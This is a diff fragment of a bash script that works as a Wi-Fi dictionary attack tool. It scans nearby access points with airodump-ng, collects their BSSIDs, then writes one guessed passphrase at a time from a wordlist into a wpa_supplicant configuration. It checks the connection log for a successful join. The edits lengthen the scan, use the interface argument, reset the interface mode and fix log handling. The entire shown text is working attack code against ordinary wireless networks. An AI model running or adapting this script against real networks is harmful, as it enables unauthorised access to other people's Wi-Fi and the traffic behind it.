@@ -40,13 +40,13 @@ done
 INTERFACE=$1
 DICT=$2
 
-SCAN_TIME=3
+SCAN_TIME=6
 #exit 1
 
 # ==========================
 
 # ========== GET BSSID ==========
-airodump-ng wlan1 --output-format csv -w air &
+airodump-ng $INTERFACE --output-format csv -w air &
 sleep $SCAN_TIME
 killall airodump-ng
 touch bssid.txt
@@ -54,6 +54,10 @@ sleep 1
 
 cat air-01.csv | awk {'print $1'} | grep --colour=never ":" | sed 's/.$//' > bssid.txt
 count=$(cat bssid.txt | wc -l)
+
+timeout 2 ifconfig $INTERFACE down
+timeout 2 iwconfig $INTERFACE mode managed
+timeout 2 ifconfig $INTERFACE up
 
 echo "[+] Complete!!!"
 echo "Count bssid's: $count"
@@ -73,7 +77,7 @@ do
     echo -e "\tpsk=\"$pass\"" >> wpa_supplicant.conf
     echo "}" >> wpa_supplicant.conf
     
-    timeout 15 wpa_supplicant -i $INTERFACE -c wpa_supplicant.conf 2>&1 >> wpa_supplicant.log
+    timeout 15 wpa_supplicant -i $INTERFACE -c wpa_supplicant.conf 2>&1 > wpa_supplicant.log
 
     if grep -q "completed" "wpa_supplicant.log";
     then
